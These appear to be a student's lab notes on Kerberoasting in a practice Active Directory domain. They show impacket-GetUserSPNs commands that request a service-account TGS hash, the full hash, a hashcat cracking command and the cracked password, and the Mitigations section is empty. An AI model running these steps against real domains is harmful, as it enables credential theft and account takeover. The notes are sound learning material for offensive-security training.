
goal of kerbroasting:
- getting the TGS
- Decrypting server's account hash


# Lab

```
kali@kali ~> impacket-GetUserSPNs MARVEL.local/fcastle:Password1 -dc-ip 192.168.176.129
Impacket v0.11.0 - Copyright 2023 Fortra

ServicePrincipalName                    Name        MemberOf                                                     PasswordLastSet             LastLogon  Delegation
--------------------------------------  ----------  -----------------------------------------------------------  --------------------------  ---------  ----------
HYDRA-DC/SQLService.MARVEL.local:60111  SQLService  CN=Group Policy Creator Owners,OU=Groups,DC=MARVEL,DC=local  2024-03-22 18:06:04.703023  <never>



kali@kali ~> impacket-GetUserSPNs MARVEL.local/fcastle:Password1 -dc-ip 192.168.176.129 -request
Impacket v0.11.0 - Copyright 2023 Fortra

ServicePrincipalName                    Name        MemberOf                                                     PasswordLastSet             LastLogon  Delegation
--------------------------------------  ----------  -----------------------------------------------------------  --------------------------  ---------  ----------
HYDRA-DC/SQLService.MARVEL.local:60111  SQLService  CN=Group Policy Creator Owners,OU=Groups,DC=MARVEL,DC=local  2024-03-22 18:06:04.703023  <never>



[-] CCache file is not found. Skipping...
$krb5tgs$23$*SQLService$MARVEL.LOCAL$MARVEL.local/SQLService*$9aa4f5038b54fe80466afc581b2d72b5$1d25d6fb3896665ad740ac75d9cd2e06329bb1d19247ded54b772d984ba77ab21788f4003d8a99b4498d8e75fab849fdbd98ad80af33acaff2f930a724010c6558101b9c3efa00684e18a13963be1be024ffa42247967e0107a91b7c7a812c7410bf2d32b1e97dd346e4c59f3b254e5fd6c6fdba55282d5aba57a61ae241416856998a62729d627744a7c1c9115dd5cde6a978be7dc233aa954bd7ac2b4ea0e7770c0f41eeddb7ebaa5744e4d680b2f0f260cb2f2f30ee11876bbf98779edc5efe6702dd58ee0b5967d38a2736d66e0615297a464490cbc1b09246777e648e3d78887e7754ce08144df22a83a0c1e7d3492bee1b45412f77957e33697f16b7932289119b148519084b59dd1e0f1bd97a44f13005638f3281edadbb6a43bb3dfd6901650c3eb9ad0fa59329d25c331f0868659864edba5191569bd8767a35539dbdfbd9186c2a80eff82c9bccf962a12154e1ae939e090977ce8885e3720cb87c7ab5e5050edf64d163b0942b9869c936d017d6286b1a987986a69ecf608f94b101b08d130355e5f6c5b9cd5b91d7f9e63f89443eb56b8a40f40a098f42285cb014a0747b2efe5e240c209db526894e1edc2d39e6d4ea534380a1932f1c4869ec68cd48c647a8895da754de989ee77ce972b66d08fa783308651fc8fcf849d90395763a97ee92e04672c84dbc6b108c4d00a781915ace6aa5963d9cb53ee9b5f0e8c69c7d4dad0efb86de2e4257ad139561482e25980b67ac03b3b0d62aea80e13db7a050b7c375ae83fa361d1023375a97cb7042648334847e8fd98d952a1cd5fe70eb33c5ed468a7fd75dab2b8e615366f524ed72dd9206f791686b229edd6d5f90cab893392bfaa006bd96a18355241a12f50b2569907c62ae7d64e7874bf1ecf47495a4503ac51a1b44b49c86871816109a9ed6da062b60822d6e0b555b9140217b18a9dbd52594d76c52b16f27e54a5b639923653864a0d210159001eb631b0fc872c30dfd44e360b6a572dcaba99bacea68edb3b3b9784afe0d409abb61157fcd3de8e7ef0dfc3a645438fe5ba7ad0b30b4de24337bb380c406d2c4409325fcd2526854b97b3aa1c166fa9020e66c1c77f0ab9eddc59dd451c751dd72fee15f09b0110236b3d33b78e251050f5d070a3fae021f1e311c719e241979eeb0f390bebfd76ee31c2d27448577b35321e58bc83273ad374fcdb1e037d7fc4a10df326e826bc0b06c5cc6cd92476c89f390ad7b6d8c567b5a6dc1948924b5c8a9f7f4304356cc195b44fde4b04b364848547311585c3ab1bea6e8279ecf1d4b946d6123a9d1de81c45f540b2260f644e6861e953e571522296d75c99a1aa5a75a68dbe5aed3bf077f94be26ce5d47226fe9188f575aab561496a473301cd999f10810a2d16f8996038ec4511aa03401d9600f9916d1ea4def172e162aef0ec51df0d5f780aff1f754692bc7ff7731c84671576e1adfff6d5c4d5287e8e811336fa0777e8db5eae82b7a77a972

```


## Cracking it

```
.\hashcat.exe  -m 13100 ssh.txt rockyou.txt -O -D 2
```

```
PS E:\hash\hashcat-6.2.6> .\hashcat.exe  -m 13100 ssh.txt rockyou.txt -O -D 2 --show
$krb5tgs$23$*SQLService$MARVEL.LOCAL$MARVEL.local/SQLService*$9aa4f5038b54fe80466afc581b2d72b5$1d25d6fb3896665ad740ac75d9cd2e06329bb1d19247ded54b772d984ba77ab21788f4003d8a99b4498d8e75fab849fdbd98ad80af33acaff2f930a724010c6558101b9c3efa00684e18a13963be1be024ffa42247967e0107a91b7c7a812c7410bf2d32b1e97dd346e4c59f3b254e5fd6c6fdba55282d5aba57a61ae241416856998a62729d627744a7c1c9115dd5cde6a978be7dc233aa954bd7ac2b4ea0e7770c0f41eeddb7ebaa5744e4d680b2f0f260cb2f2f30ee11876bbf98779edc5efe6702dd58ee0b5967d38a2736d66e0615297a464490cbc1b09246777e648e3d78887e7754ce08144df22a83a0c1e7d3492bee1b45412f77957e33697f16b7932289119b148519084b59dd1e0f1bd97a44f13005638f3281edadbb6a43bb3dfd6901650c3eb9ad0fa59329d25c331f0868659864edba5191569bd8767a35539dbdfbd9186c2a80eff82c9bccf962a12154e1ae939e090977ce8885e3720cb87c7ab5e5050edf64d163b0942b9869c936d017d6286b1a987986a69ecf608f94b101b08d130355e5f6c5b9cd5b91d7f9e63f89443eb56b8a40f40a098f42285cb014a0747b2efe5e240c209db526894e1edc2d39e6d4ea534380a1932f1c4869ec68cd48c647a8895da754de989ee77ce972b66d08fa783308651fc8fcf849d90395763a97ee92e04672c84dbc6b108c4d00a781915ace6aa5963d9cb53ee9b5f0e8c69c7d4dad0efb86de2e4257ad139561482e25980b67ac03b3b0d62aea80e13db7a050b7c375ae83fa361d1023375a97cb7042648334847e8fd98d952a1cd5fe70eb33c5ed468a7fd75dab2b8e615366f524ed72dd9206f791686b229edd6d5f90cab893392bfaa006bd96a18355241a12f50b2569907c62ae7d64e7874bf1ecf47495a4503ac51a1b44b49c86871816109a9ed6da062b60822d6e0b555b9140217b18a9dbd52594d76c52b16f27e54a5b639923653864a0d210159001eb631b0fc872c30dfd44e360b6a572dcaba99bacea68edb3b3b9784afe0d409abb61157fcd3de8e7ef0dfc3a645438fe5ba7ad0b30b4de24337bb380c406d2c4409325fcd2526854b97b3aa1c166fa9020e66c1c77f0ab9eddc59dd451c751dd72fee15f09b0110236b3d33b78e251050f5d070a3fae021f1e311c719e241979eeb0f390bebfd76ee31c2d27448577b35321e58bc83273ad374fcdb1e037d7fc4a10df326e826bc0b06c5cc6cd92476c89f390ad7b6d8c567b5a6dc1948924b5c8a9f7f4304356cc195b44fde4b04b364848547311585c3ab1bea6e8279ecf1d4b946d6123a9d1de81c45f540b2260f644e6861e953e571522296d75c99a1aa5a75a68dbe5aed3bf077f94be26ce5d47226fe9188f575aab561496a473301cd999f10810a2d16f8996038ec4511aa03401d9600f9916d1ea4def172e162aef0ec51df0d5f780aff1f754692bc7ff7731c84671576e1adfff6d5c4d5287e8e811336fa0777e8db5eae82b7a77a972:MYpassword123#
```

the first to do after 1 account gets compromised, you check for kerbroastable accounts



# Mitigations